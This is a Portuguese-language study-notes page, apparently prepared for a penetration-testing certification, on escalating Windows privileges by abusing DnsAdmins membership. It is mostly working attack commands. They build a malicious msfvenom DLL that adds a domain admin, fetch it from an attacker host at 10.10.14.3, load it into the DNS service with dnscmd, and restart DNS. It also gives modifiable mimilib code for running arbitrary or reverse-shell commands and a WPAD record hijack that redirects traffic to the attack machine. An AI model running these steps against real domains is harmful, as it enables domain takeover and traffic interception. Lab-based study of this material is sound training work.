> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/windows-privilege-escalation/dnsadmins.md).

# DnsAdmins

Os membros do grupo [DnsAdmins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#dnsadmins) têm acesso às informações de DNS na rede.

**Geração de DLL maliciosa**

* Podemos gerar uma DLL maliciosa para adicionar um usuário ao grupo `domain admins` usando `msfvenom`&#x20;

```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

* Em seguida, inicie um servidor HTTP em Python

```bash
python3 -m http.server 7777
```

* Faça o download do arquivo para o destino

```bash
wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
```

* **Carregando DLL como membro do grupo DnsAdmins**

```bash
Get-ADGroupMember -Identity DnsAdmins
```

* **Carregando DLL personalizada**

```bash
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

* Primeiro, precisamos do SID do nosso usuário

```bash
wmic useraccount where name="netadm" get sid
```

* **Verificando permissões no serviço DNS**

```bash
sc.exe sdshow DNS
```

* **Interrompendo o serviço DNS**

```bash
sc stop dns
```

* **Iniciando o serviço DNS**

```ps
sc start dns
```

* **Confirmação de participação no grupo**

```powershell
 net group "Domain Admins" /dom
```

**Confirmação da adição da chave de registro**

* O primeiro passo é confirmar se a `ServerLevelPluginDll`chave de registro existe. Até que nossa DLL personalizada seja removida, não conseguiremos iniciar o serviço DNS corretamente.

```ps
reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
```

* Podemos usar o `reg delete`comando para remover a chave que aponta para nossa DLL personalizada.

```ps
reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
```

* Assim que isso for concluído, podemos iniciar o serviço DNS novamente.

```ps
sc.exe start dns
```

* **Verificando o status do serviço DNS**

```ps
sc query dns
```

**Usando Mimilib.dll**

Conforme detalhado nesta [postagem](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) , também podemos utilizar [o mimilib.dll,](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) fornecido pelo criador da `Mimikatz`ferramenta, para obter execução de comandos, modificando o arquivo [kdns.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) para executar um comando reverso de uma linha ou outro comando de nossa escolha.

```c
/*  Benjamin DELPY `gentilkiwi`
    https://blog.gentilkiwi.com
    benjamin@gentilkiwi.com
    Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kdns.h"

DWORD WINAPI kdns_DnsPluginInitialize(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)
{
    return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginCleanup()
{
    return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)
{
    FILE * kdns_logfile;
#pragma warning(push)
#pragma warning(disable:4996)
    if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
#pragma warning(pop)
    {
        klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
        fclose(kdns_logfile);
        system("ENTER COMMAND HERE");
    }
    return ERROR_SUCCESS;
}
```

**Desativar a lista de bloqueio de consultas globais**

* Para configurar esse ataque, primeiro desativamos a lista de bloqueio de consultas global:

```ps
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```

**Adicionando um registro WPAD**

* Em seguida, adicionamos um registro WPAD apontando para nossa máquina de ataque.

```ps
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```
